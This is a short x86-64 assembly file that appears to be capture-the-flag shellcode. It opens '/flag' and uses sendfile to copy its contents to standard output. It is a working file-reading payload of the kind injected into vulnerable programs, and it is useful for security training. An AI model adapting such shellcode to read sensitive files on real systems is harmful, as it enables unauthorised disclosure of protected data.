.global _start
_start:
.intel_syntax noprefix
        mov eax, 2
        lea edi, [rip+flag]
        mov esi, 0
        mov edx, 0
        syscall

        mov ecx, eax

        mov eax, 40
        mov edi, 1
        mov esi, ecx
        mov edx, 0
        mov r10d, 300
        syscall

flag:
        .string "/flag"


